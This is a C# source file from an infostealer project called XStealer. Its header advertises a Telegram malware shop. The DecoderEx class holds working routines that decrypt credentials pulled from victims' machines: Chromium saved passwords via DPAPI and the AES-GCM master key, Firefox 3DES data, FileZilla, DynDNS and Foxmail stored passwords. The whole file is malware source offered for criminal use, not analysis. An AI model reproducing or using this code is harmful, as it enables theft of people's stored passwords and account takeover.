// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Helpers
{
    using System;
    using System.Globalization;
    using System.IO;
    using System.Linq;
    using System.Security.Cryptography;
    using System.Text;
    using Modules.Browsers.Chromium;

    public static class DecoderEx
    {
        #region For Chromium Decrypt | Для расшифровки Chromium

        /// <summary>
        /// <br><b>~[RUS]~</b></br><br>Метод для расшифровки строки DPAPI</br>
        /// <br><b>~[ENG]~</b></br><br>Method for decrypting DPAPI string</br>
        /// </summary>
        /// <param name="s"><br><b>~[RUS]~</b></br><br>Строка для расшифровки</br><br><b>~[ENG]~</b></br><br>Decryption string</br></param>
        /// <param name="scope"><br><b>~[RUS]~</b></br><br>Область защиты данных</br><br><b>~[ENG]~</b></br><br>Data protection scope</br></param>
        /// <returns><br><b>~[RUS]~</b></br><br>Расшифрованная строка</br><br><b>~[ENG]~</b></br><br>Decoded string</br></returns>
        public static string UnprotectDataEx(string s, DataProtectionScope scope)
        {
            string result = string.Empty;
            if (!string.IsNullOrWhiteSpace(s))
            {
                try
                {
                    result = ConverterEx.ToString(true, ProtectedData.Unprotect(Convert.FromBase64String(s), null, scope));
                }
                catch { return s; }
            }
            return result;
        }

        /// <summary>
        /// <br><b>~[RUS]~</b></br><br>Метод для расшифровки мастер ключ пароля</br>
        /// <br><b>~[ENG]~</b></br><br>Method for decrypting master key password</br>
        /// </summary>
        /// <param name="bEncryptedData"><br><b>~[RUS]~</b></br><br>Шифрованные входные данные</br><br><b>~[ENG]~</b></br><br>Encrypted input</br></param>
        /// <param name="bMasterKey"><br><b>~[RUS]~</b></br><br>Мастер ключ</br><br><b>~[ENG]~</b></br><br>Master Key</br></param>
        /// <returns><br><b>~[RUS]~</b></br><br>Расшифрованный мастер ключ</br><br><b>~[ENG]~</b></br><br>Decrypted Master key</br></returns>
        public static byte[] DecryptWithKey(byte[] bEncryptedData, byte[] bMasterKey)
        {
            try
            {
                byte[] bIV = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }, bTag = new byte[16];
                Array.Copy(bEncryptedData, 3, bIV, 0, 12);
                var bBuffer = new byte[bEncryptedData.Length - 15];
                Array.Copy(bEncryptedData, 15, bBuffer, 0, bEncryptedData.Length - 15);
                var bData = new byte[bBuffer.Length - bTag.Length];
                Array.Copy(bBuffer, bBuffer.Length - 16, bTag, 0, 16);
                Array.Copy(bBuffer, 0, bData, 0, bBuffer.Length - bTag.Length);
                return AesGcmEx.Decrypt(bMasterKey, bIV, null, bData, bTag);
            }
            catch { return null; }
        }

        public static string DecryptEx(string sLoginData, string sPassword)
        {
            if (sPassword.StartsWith("v10") || sPassword.StartsWith("v11") || sPassword.StartsWith("v12"))
            {
                // Получаем путь до Мастер-Ключ базы
                byte[] bMasterKey = CBox.GetMasterKey(Directory.GetParent(sLoginData).Parent.FullName);
                // Возвращаем расшифрованный пароль
                return ConverterEx.ToString(false, DecryptWithKey(ConverterEx.ToBytes(true, sPassword), bMasterKey));
            }
            else
            {
                // Расшифровка стандартным DPAPI
                string DecryptPassword = ConverterEx.ToString(true, ProtectedData.Unprotect(ConverterEx.ToBytes(true, sPassword), null, DataProtectionScope.CurrentUser)).TrimEnd('\0');
                return DecryptPassword;
            }
        }
        #endregion

        #region For Gecko Decrypt | Для расшифровки Gecko
        public static string TripDes_Decrypt(byte[] key, byte[] iv, byte[] input, PaddingMode gMode = PaddingMode.None)
        {
            string result = string.Empty;
            if (key.Any() && iv.Any() && input.Any())
            {
                try
                {
                    using var trip = new TripleDESCryptoServiceProvider { Key = key, IV = iv, Mode = CipherMode.CBC, Padding = gMode };
                    using ICryptoTransform cryptoTransform = trip.CreateDecryptor(key, iv);
                    result = Encoding.Default.GetString(cryptoTransform?.TransformFinalBlock(input, 0, input.Length));
                }
                catch { }
            }
            return result;
        }
        #endregion

        #region For Apps Decrypt | Для расшифровки приложений

        public static string DecryptFZilla(string Text) 
        {
            string result = string.Empty;
            if (!string.IsNullOrWhiteSpace(Text))
            {
                try
                {
                    result = ConverterEx.ToString(false, Convert.FromBase64String(Text)); // Encoding.UTF8.GetString
                }
                catch { }
            }
            return result;
        }

        public static string DecryptDns(string encrypted) 
        {
            string decoded = string.Empty;
            for (int i = 0; i < encrypted.Length; i += 2)
                decoded += (char)int.Parse(encrypted.Substring(i, 2), NumberStyles.HexNumber);

            char[] outcome = decoded.ToCharArray(), chars = new char[decoded.Length];
            for (int i = 0; i < chars.Length; i++)
            {
                try
                {
                    int lPtr = 0;
                    chars[i] = (char)(outcome[i] ^ Convert.ToChar("t6KzXhCh".Substring(lPtr, 1)));
                    lPtr = (lPtr + 1) % 8;
                }
                catch (Exception) { continue; }
            }
            return new string(chars);
        }

        public static string DecodeFoxMail(int version, string pHash) 
        {
            string result = string.Empty;

            int[] a = { '~', 'd', 'r', 'a', 'G', 'o', 'n', '~' }, v7a = { '~', 'F', '@', '7', '%', 'm', '$', '~' };
            int fc0 = Convert.ToInt32("5A", 16), size = pHash.Length / 2, index = 0;
            if (version == 1) { a = v7a; fc0 = Convert.ToInt32("71", 16); }
            int[] b = new int[size], c = new int[b.Length];
            for (int i = 0; i < size; i++) { b[i] = Convert.ToInt32(pHash.Substring(index, 2), 16); index += 2; }
            c[0] = b[0] ^ fc0;
            Array.Copy(b, 1, c, 1, b.Length - 1);
            while (b.Length > a.Length)
            {
                int[] newA = new int[a.Length * 2];
                Array.Copy(a, 0, newA, 0, a.Length);
                Array.Copy(a, 0, newA, a.Length, a.Length);
                a = newA;
            }
            int[] d = new int[b.Length];
            for (int i = 1; i < b.Length; i++) { d[i - 1] = b[i] ^ a[i - 1]; }
            int[] e = new int[d.Length];
            for (int i = 0; i < d.Length - 1; i++) { e[i] = d[i] - c[i] < 0 ? d[i] + 255 - c[i] : d[i] - c[i]; result += (char)e[i]; }
            return result;
        }

        #endregion
    }
}